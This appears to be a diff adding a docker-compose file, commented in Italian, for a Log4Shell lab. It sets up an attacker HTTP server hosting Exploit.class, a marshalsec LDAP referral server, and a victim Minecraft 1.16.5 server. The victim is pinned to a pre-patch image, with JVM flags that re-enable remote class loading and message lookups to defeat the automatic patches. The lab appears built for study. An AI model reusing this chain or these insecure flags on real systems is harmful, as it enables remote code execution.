@@ -1,0 +1,85 @@
+services:
+
+  # ─────────────────────────────────────────────────────────
+  # 1. SERVER HTTP — serve Exploit.class al server LDAP
+  #    Va avviato PRIMA del server LDAP (dipendenza)
+  # ─────────────────────────────────────────────────────────
+  http-attacker:
+    image: python:3.9-slim
+    container_name: http-attacker
+    volumes:
+      - ./payload:/app
+    working_dir: /app
+    command: python3 -m http.server 8888
+    networks:
+      - lab-log4shell
+    # Healthcheck: aspetta che la porta 8888 risponda prima
+    # che ldap-attacker si avvii
+    healthcheck:
+      test: ["CMD-SHELL", "python3 -c \"import urllib.request; urllib.request.urlopen('http://localhost:8888/Exploit.class')\""]
+      interval: 5s
+      timeout: 5s
+      retries: 10
+      start_period: 5s
+
+  # ─────────────────────────────────────────────────────────
+  # 2. SERVER LDAP MALEVOLO — risponde alla JNDI lookup
+  #    Build da sorgente: il JAR pre-built non esiste su GitHub
+  # ─────────────────────────────────────────────────────────
+  ldap-attacker:
+    build:
+      context: .
+      dockerfile: Dockerfile.ldap
+    container_name: ldap-attacker
+    # Attende che http-attacker sia healthy prima di partire
+    depends_on:
+      http-attacker:
+        condition: service_healthy
+    networks:
+      - lab-log4shell
+    # L'URL punta a http-attacker (risolto via DNS interno Docker)
+    command: >
+      java -cp /app/marshalsec.jar
+      marshalsec.jndi.LDAPRefServer
+      "http://http-attacker:8888/#Exploit"
+      1389
+
+  # ─────────────────────────────────────────────────────────
+  # 3. SERVER MINECRAFT VITTIMA
+  #    - Versione 1.16.5 (Log4j 2.8.1 — vulnerabile)
+  #    - Immagine PINNED a java8 pre-patch (dec 2021)
+  #    - trustURLCodebase=true  → abilita il remote classloading
+  #    - formatMsgNoLookups=false → assicura lookup abilitati
+  # ─────────────────────────────────────────────────────────
+  mc-server:
+    # IMPORTANTE: usiamo un tag specifico pre-patch di itzg.
+    # Le versioni > 2021.18 aggiungono -Dlog4j2.formatMsgNoLookups=true
+    # automaticamente nelle JAVA_TOOL_OPTIONS, che ha precedenza su JVM_OPTS.
+    image: itzg/minecraft-server:2021.16.0-java8
+    container_name: mc-server
+    ports:
+      - "25565:25565"
+    environment:
+      EULA: "TRUE"
+      VERSION: "1.16.5"
+      ONLINE_MODE: "FALSE"
+      # Forziamo entrambe le variabili per sicurezza:
+      # JVM_OPTS  → opzioni aggiuntive al launcher
+      # JAVA_TOOL_OPTIONS viene letto direttamente dalla JVM
+      JVM_OPTS: >-
+        -Dcom.sun.jndi.ldap.object.trustURLCodebase=true
+        -Dcom.sun.jndi.rmi.object.trustURLCodebase=true
+        -Dlog4j2.formatMsgNoLookups=false
+      # JAVA_TOOL_OPTIONS viene letto prima di qualsiasi altro flag;
+      # lo impostiamo esplicitamente per annullare eventuali patch automatiche
+      JAVA_TOOL_OPTIONS: >-
+        -Dcom.sun.jndi.ldap.object.trustURLCodebase=true
+        -Dlog4j2.formatMsgNoLookups=false
+    depends_on:
+      - ldap-attacker
+    networks:
+      - lab-log4shell
+
+networks:
+  lab-log4shell:
+    driver: bridge
